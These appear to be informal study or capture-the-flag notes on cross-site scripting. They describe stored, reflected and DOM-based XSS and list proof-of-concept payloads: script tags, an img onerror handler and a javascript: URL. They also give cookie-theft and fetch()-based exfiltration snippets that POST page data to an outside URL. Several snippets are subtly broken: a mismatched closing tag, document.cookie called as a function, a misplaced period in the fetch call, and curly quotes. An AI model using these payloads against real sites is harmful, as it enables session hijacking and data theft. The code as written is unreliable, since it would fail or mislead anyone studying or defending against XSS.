## Introduction

Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users.

## Types of XSS

1. **Stored XSS**: The malicious script is permanently stored on the target server.
2. **Reflected XSS**: The malicious script is reflected off a web server, such as in an error message or search result.
3. **DOM-based XSS**: The vulnerability exists in client-side code rather than server-side code.

## How XSS Works

XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser-side script, to a different end user. The end user's browser has no way to know that the script should not be trusted and will execute it. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site.

It’s used when you find an unsanitized input that you can write things that a webpage can read as html code.

POC:

```html
<h1>Hola</hola>
<script>alert("This is XSS")</script>
<img src="x" onerror="alert('This is XSS')"/> <!--also valid with onload -->
javascript:alert('This is XSS') 
```

This can be used to exfiltrate cookies.

To do this, you need to make someone use the malicious url that you created to get the cookies

```html
<script>document.cookie()</script>
```

There is also another way to get the entire code from a webpage, when you can also get cookies.
    
```html
fetch(“[URL]”, {
method : “POST",
body : "FLAG" 
}).then(response => response.text())
.then(output => console.log(output))

<!-- example -->

fetch('https://google.com'.{
	method: 'POST',
	body: contenido
}).then(r => r.text()).then(contenido => {console.log(contenido)})
```
